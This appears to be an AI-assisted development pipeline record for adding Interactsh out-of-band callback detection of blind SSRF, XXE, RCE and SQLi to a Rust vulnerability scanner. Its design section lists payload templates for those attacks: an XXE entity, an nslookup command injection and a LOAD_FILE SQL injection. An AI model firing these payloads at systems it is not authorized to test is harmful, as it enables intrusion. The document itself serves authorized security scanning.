# Work Pipeline: Interactsh OOB Callback Integration for Blind Vulnerability Detection

| Field | Value |
|-------|-------|
| **Pipeline Type** | Work |
| **Work Type** | Feature |
| **Status** | Complete |
| **Created** | 2026-03-29 |
| **Last Updated** | 2026-03-29 |
| **Last Command** | /implement |
| **Next Step** | Run `/complete` for Phase 6 |
| **Blocked** | No |
| **Forge Ticket** | #11 |
| **Forge Ticket ID** | 019d3a83-55f9-73e8-bf08-fcbccb56ddb7 |

---

## Phase 1: Plan
**Command:** /work
**Status:** PASS
**Started:** 2026-03-29
**Completed:** 2026-03-29

### Work Spec
- **Title:** Interactsh OOB callback integration for blind vulnerability detection
- **Type:** Feature
- **Scope:** Wrap the `interactsh-client` CLI to provide out-of-band (OOB) callback infrastructure. Add an `OobClient` abstraction in `engine/` that generates unique callback URLs, polls for interactions, and correlates callbacks back to originating test payloads. Create an `interactsh` tool wrapper module in `tools/`. This enables detection of blind SSRF, blind XXE, blind RCE, and blind SQLi — vulnerability classes currently undetectable without OOB correlation.
- **Files Expected:** ~5 files (1 new engine module, 1 new tool wrapper, modifications to engine/mod.rs, tools/mod.rs, and possibly scan_context.rs)
- **Dependencies:** `interactsh-client` CLI (external, from ProjectDiscovery). No new Rust crate dependencies expected — wraps CLI via subprocess like other tool wrappers.
- **Risks:**
  - `interactsh-client` not installed on user system — must handle gracefully (like all tool wrappers)
  - Network connectivity required to reach Interactsh servers — polling timeouts and failures need clean error handling
  - Correlation accuracy — must reliably match callbacks to originating payloads via correlation IDs
  - Timing — blind callbacks may arrive after the scan module finishes; need configurable poll timeout
- **Acceptance Criteria:**
  - `OobClient` in `engine/oob.rs` provides: `register()` (get session), `generate_url(correlation_id)`, `poll(timeout)`, `deregister()`
  - `InteractshModule` tool wrapper in `tools/interactsh.rs` wraps the CLI and runs a basic blind detection scan
  - Graceful degradation when `interactsh-client` is not installed
  - Unit tests for OOB types and correlation logic
  - Integration test for the tool wrapper module
  - `cargo test` passes with no regressions
  - `cargo clippy` clean, `cargo fmt` clean

### Preflight Results
| Check | Status |
|-------|--------|
| Forge MCP | OK |
| Toolchain | OK — cargo 1.94.0, rustc 1.94.0 |
| Security tools | OK — semgrep 1.156.0, cargo-audit 0.22.1, cargo-deny 0.19.0 |
| Hooks wired | OK — 8/8 |
| cargo check | OK |
| cargo test | OK — 57 default passed |
| Active pipelines | None |

### Human Confirmed
- [x] Spec reviewed and confirmed (user pre-approved design)

### Known Pitfalls (from RLM)
- After ANY context continuation, re-read all active pipeline documents before resuming work
- MANDATORY: Call bootstrap -> ticket-next -> recall BEFORE writing any code
- NEVER modify a published migration after it has been tagged in a release

---

## Forge Briefing

Every phase command MUST call these Forge MCP tools:

1. **Bootstrap** — `bootstrap` for project context, architecture decisions, active patterns
2. **Recall** — `recall(agent="{role}", phase={N}, component_types=[...])` for targeted failures and lessons
3. **Learn** — `learn(summary, topic, component_types)` to record what was discovered
4. **Search** — `search-architecture-docs` for project patterns before writing code

These are enforced by `enforce-completion.sh`. Skipping them blocks the conversation from ending.

---

## Phase 2: Design
**Command:** /design
**Status:** PASS
**Started:** 2026-03-29
**Completed:** 2026-03-29

### Architecture

**Approach:**
Wrap `interactsh-client` CLI as a long-running subprocess to provide OOB callback infrastructure. Unlike simple tool wrappers that call `subprocess::run_tool()` for a one-shot execution, Interactsh requires a persistent subprocess: start the client, parse the generated base URL from stdout, inject OOB callback URLs into target parameters, wait for callbacks, then parse interaction JSON from stdout and kill the process.

Two components:
1. **`engine/oob.rs`** — OOB infrastructure types and `InteractshSession` subprocess manager. Lives in `engine/` because it's shared infrastructure that future scanner modules (SSRF, XXE, cmdi, injection) will consume. Provides: session start/stop, callback URL generation with embedded correlation IDs, interaction polling with timeout, and interaction-to-correlation matching.
2. **`tools/interactsh.rs`** — `InteractshModule` implementing `ScanModule`. Uses `InteractshSession` to detect blind vulnerabilities by injecting OOB callback URLs into the target's parameters across four blind vulnerability classes (SSRF, XXE, RCE, SQLi). Reports findings when callbacks are received.

**Key Design Decisions:**

- **No `OobClient` trait** — Only one OOB provider exists (Interactsh). A trait for a single implementation is premature abstraction. If a second provider is added later, extract the trait then.
- **Long-running subprocess** — Cannot use `subprocess::run_tool()` (which runs to completion). Instead, spawn `interactsh-client -json -v` via `tokio::process::Command` with piped stdout, parse the base URL from initial output, then read interaction JSON lines asynchronously.
- **Correlation via subdomain prefix** — Each test payload gets a unique correlation ID (e.g., `ssrf-param-url`). The callback URL is `{correlation_id}.{base_domain}`. When an interaction arrives, match its `full-id` field against known correlation IDs.
- **Configurable poll timeout** — Default 10 seconds. Blind callbacks may be delayed by DNS caching, network latency, or async server processing. The timeout balances detection vs scan speed.
- **Graceful degradation** — `requires_external_tool() = true`, `required_tool() = Some("interactsh-client")`. Orchestrator skips the module when the tool isn't installed (existing pattern).

**Subprocess Lifecycle:**
```
1. Check `interactsh-client` exists (which)
2. Spawn: interactsh-client -json -v
3. Read stdout lines until base URL is extracted (regex: *.oast.*)
4. Generate callback URLs: {correlation_id}.{base_url}
5. Inject payloads into target (HTTP requests with OOB URLs)
6. Sleep for poll_timeout duration
7. Read remaining stdout lines, parse JSON interactions
8. Kill child process
9. Match interactions to correlation IDs → Findings
```

**Blind Payload Categories:**
| Category | Payload Template | Correlation Prefix | Severity |
|----------|-----------------|-------------------|----------|
| Blind SSRF | `http://{oob_url}` injected into URL-like params | `ssrf-{param}` | Critical |
| Blind XXE | `<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{oob_url}">]>&xxe;` | `xxe` | Critical |
| Blind RCE | `; nslookup {oob_url}`, `` `nslookup {oob_url}` `` | `rce-{param}` | Critical |
| Blind SQLi | `' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\','{oob_url}','\\a')))-- -` | `sqli-{param}` | High |

**OOB Interaction JSON Format (from interactsh-client):**
```json
{
  "protocol": "dns",
  "unique-id": "abc123def456",
  "full-id": "ssrf-url.abc123def456",
  "raw-request": "...",
  "remote-address": "1.2.3.4",
  "timestamp": "2026-03-29T..."
}
```

**File Manifest:**
| # | File | Action | Purpose |
|---|------|--------|---------|
| 1 | `src/engine/oob.rs` | Create | OOB types (`OobInteraction`), `InteractshSession` (subprocess lifecycle, URL generation, polling, correlation matching), blind payload templates |
| 2 | `src/engine/mod.rs` | Modify | Add `pub mod oob;` |
| 3 | `src/tools/interactsh.rs` | Create | `InteractshModule` implementing `ScanModule` — orchestrates blind detection using `InteractshSession` |
| 4 | `src/tools/mod.rs` | Modify | Add `pub mod interactsh;` and register `InteractshModule` in `register_modules()` |

**Type and Trait Changes:**

New types in `engine/oob.rs`:
- `OobInteraction` — `#[derive(Debug, Clone, Serialize, Deserialize)]` with fields: `protocol`, `unique_id`, `full_id`, `raw_request`, `remote_address`, `timestamp`
- `InteractshSession` — manages subprocess lifecycle, holds `base_url: String` and collected `interactions: Vec<OobInteraction>`
- `BlindPayload` — struct with `correlation_id`, `category` (enum: Ssrf, Xxe, Rce, Sqli), `template` string
- `BlindCategory` — enum for payload classification

No trait changes. No modifications to `ScanModule`, `ScanContext`, or existing types.

**Error Handling Strategy:**
- `ScorchError::ToolNotFound` — interactsh-client not in PATH (existing variant)
- `ScorchError::ToolFailed` — subprocess exits non-zero (existing variant)
- `ScorchError::ToolOutputParse` — cannot parse base URL or interaction JSON from stdout (existing variant)
- `ScorchError::Cancelled` — poll timeout exceeded (existing variant)
- No new error variants needed — all failure modes map to existing `ScorchError` variants.

**Testing Strategy:**
- Unit tests in `engine/oob.rs` (`#[cfg(test)] mod tests`):
  - `OobInteraction` deserialization from actual interactsh JSON format (with `serde(rename)` for kebab-case fields)
  - Callback URL generation with correlation IDs
  - Interaction-to-correlation matching logic
  - Blind payload template generation for all 4 categories
  - `BlindCategory` display/serialization
- No integration test with live interactsh (tool not installed, and would require network) — tested via unit tests on parsing/correlation logic
- Existing `tests/cli.rs::test_modules_list` will auto-verify interactsh appears in module listing once registered

**Regression Test Plan:**
| # | Test Name | File | Verifies |
|---|-----------|------|----------|
| 1 | `cargo test` (default) | N/A | All existing 57+ tests pass, no regressions |
| 2 | `cargo clippy --all-features` | N/A | No new warnings |
| 3 | `test_interaction_deserialize` | `src/engine/oob.rs` | Parses interactsh JSON with kebab-case fields |
| 4 | `test_callback_url_generation` | `src/engine/oob.rs` | `{id}.{base}` URL format correct |
| 5 | `test_correlation_matching` | `src/engine/oob.rs` | Matches interaction full_id to correlation ID |
| 6 | `test_blind_payloads_contain_oob_url` | `src/engine/oob.rs` | All payload templates inject the OOB URL |
| 7 | `test_blind_category_variants` | `src/engine/oob.rs` | All 4 categories serializable |
| 8 | `test_modules_list` | `tests/cli.rs` | interactsh appears in `--check-tools` output |

**Architectural Decisions:**
- **OOB in `engine/` not `tools/`** — `InteractshSession` is shared infrastructure. Future work will wire it into existing scanner modules (SSRF, XXE, cmdi). Placing it in `engine/` alongside `scan_context.rs` makes it importable from both `scanner/` and `tools/`.
- **No `ScanContext` modification** — Tempting to add `Option<InteractshSession>` to `ScanContext` so all modules can use OOB. Deferred: this pipeline creates the infrastructure; a follow-up pipeline wires it into `ScanContext` and existing modules. Keeps this change self-contained.
- **Single module, not per-vuln-class modules** — One `InteractshModule` tests all 4 blind categories rather than 4 separate modules. This matches the tool wrapper pattern (one module per tool) and avoids spawning 4 separate interactsh sessions.

### Deferred Items
- Wiring `InteractshSession` into `ScanContext` for use by existing scanner modules (SSRF, XXE, cmdi, injection) — separate ticket
- Custom Interactsh server URL configuration (currently uses default public servers) — future config enhancement
- SMTP/FTP/LDAP OOB protocol payloads (this pipeline covers DNS/HTTP only) — future enhancement

### Issues Found
- None

### Knowledge Recorded
- **Lessons:** 1
- **Failures:** 0
- **Component Types:** engine, tools, scanner

### Human Confirmed
- [x] Design reviewed and confirmed (user pre-approved)

## Phase 3: Implement
**Command:** /implement
**Status:** PASS
**Started:** 2026-03-29
**Completed:** 2026-03-29

### Files Created
| File | Path |
|------|------|
| OOB callback infrastructure | `src/engine/oob.rs` |
| Interactsh tool wrapper module | `src/tools/interactsh.rs` |

### Files Modified
| File | Change |
|------|--------|
| `src/engine/mod.rs` | Added `pub mod oob;` |
| `src/tools/mod.rs` | Added `pub mod interactsh;` and registered `InteractshModule` in `register_modules()` |

### Quality Gates
- **cargo fmt --check:** Pass — zero diffs
- **cargo clippy --all-features:** Pass — zero warnings from new files
- **cargo test:** Pass — 67 passed, 0 failed (was 57, +10 new OOB unit tests)

### Notes
- Followed design exactly — two-component architecture (engine/oob.rs + tools/interactsh.rs)
- Used `serde_json::Result` instead of `anyhow::Result` in tests (anyhow not a default dependency)
- Used `Url::query_pairs_mut()` for URL encoding instead of adding `urlencoding` crate dependency
- 10 new unit tests cover: interaction deserialization, callback URL generation, correlation matching, payload generation, category serde, base URL extraction

## Phase 4: Validate
**Command:** /validate
**Status:** PASS
**Started:** 2026-03-29
**Completed:** 2026-03-29

### Entry Verification (independently run)
- **cargo fmt --check:** Pass — zero diffs
- **cargo clippy --all-features:** Pass — zero warnings in new files
- **cargo test:** Pass — 67 default passed, 0 failed
- **```ignore check:** 0 files
- **#[ignore] check:** 0 matches
- **#[allow] check:** 0 in new files
- **semgrep:** Clean

### Code Review
- **Documentation:** All pub items have `///` doc comments, both modules have `//!` docs
- **Error Handling:** No unwrap/expect in library code, `# Errors` sections on all Result fns, `?` propagation throughout
- **Type Design:** All types derive Debug, no unnecessary allocations
- **Safety:** No unsafe blocks, async types are Send
- **Code Quality:** Iterators preferred, exhaustive pattern matching on BlindCategory, no dead code
- **Workaround Detection:** No #[allow], no #[ignore], no ```ignore

### Test Results
- **Default Test Count:** 67 passed, 0 failed (was 57, +10 new)
- **MCP Test Count:** 164 passed, 0 failed (was 154, +10 new)
- **Doctest Count:** 1 passed (unchanged)

### Regression Test Plan Compliance
- 8/8 planned tests passing
- 4 bonus tests: deserialize_minimal, extract_base_url, payloads_unique_ids, correlation_id_extraction

## Phase 5: Verify (Full Suite)
**Command:** /verify
**Status:** PASS
**Started:** 2026-03-29
**Completed:** 2026-03-29

### Entry Verification (Independent)
- **cargo fmt --check:** Pass — zero diffs
- **cargo clippy --all-features:** Pass — zero warnings in new files
- **cargo test --features mcp:** Pass — 164 passed, 0 failed
- **cargo test --doc:** Pass — 1 doctest passed

### Full Test Suite Results
| Test Binary | Count | Result |
|-------------|-------|--------|
| lib (unit) | 48 | PASS |
| ai_types | 14 | PASS |
| cli | 16 | PASS |
| mcp_tools | 29 | PASS |
| posture_metrics | 13 | PASS |
| project_cli | 6 | PASS |
| scan_plan | 13 | PASS |
| scan_schedules | 6 | PASS |
| storage | 11 | PASS |
| storage_integration | 7 | PASS |
| doctests | 1 | PASS |
| **Total** | **164** | **PASS** |

### Regression Analysis
- **Phase 4 mcp test count:** 164
- **Phase 5 mcp test count:** 164
- **Delta:** 0 (identical across Phase 3, 4, 5)
- **Regressions:** 0

## Phase 6: Complete
**Command:** /complete
**Status:** PASS
**Started:** 2026-03-29
**Completed:** 2026-03-29

### Self-Reflection
1. **Workarounds used:** None — serde_json::Result and Url::query_pairs_mut are correct approaches, not workarounds.
2. **Cleanest version:** Yes — shared engine infra + tool wrapper is clean separation, correlation logic is pure/testable.
3. **Senior Rust approval:** Yes — proper error handling, exhaustive matching, no unsafe, full docs with # Errors.

### Documentation
- Architecture decision recorded in Forge (`engine.oob-callbacks`)
- `cargo doc --no-deps` builds (pre-existing warnings only)
- CHANGELOG.md updated (v0.12.0)

### Knowledge Recorded
- `save-generation-trace`: interactsh-oob (0 fix iterations, 164 mcp tests, 100/95 scores)
- `learn`: Pipeline completion + 5 phase lessons (plan, design, implement, validate, verify)

### Final Pipeline Checklist

#### Pipeline Document Integrity
- [x] Forge Ticket ID matches real ticket (#11, 019d3a83-55f9-73e8-bf08-fcbccb56ddb7)
- [x] ALL phases (1-5) show Status = PASS
- [x] Phase 1 has complete Work Spec
- [x] Phase 2 has File Manifest with specific paths
- [x] Phase 2 has Regression Test Plan (8 tests)
- [x] Phase 3 has Files Created/Modified lists
- [x] Phase 3 has Quality Gates with actual results
- [x] Phase 4 has Entry Verification results
- [x] Phase 4 has Code Review results
- [x] Phase 4 has Test Results with actual counts (67 default, 164 mcp)
- [x] Phase 5 has Cargo Test count (164 mcp)

#### Code Quality
- [x] `cargo fmt --check` = 0 diffs
- [x] `cargo clippy` = 0 warnings in new files
- [x] `cargo test` = 0 failures (67 default, 164 mcp)
- [x] No ```` ```ignore ```` doctests
- [x] No `#[ignore]` tests

#### Knowledge Recording
- [x] `bootstrap` called
- [x] `recall` called
- [x] `learn` called
- [x] `save-generation-trace` called
- [x] CHANGELOG.md updated (v0.12.0)

#### Documentation
- [x] Architecture decision in Forge (`engine.oob-callbacks`)
- [x] `cargo doc --no-deps` builds (pre-existing warnings only)
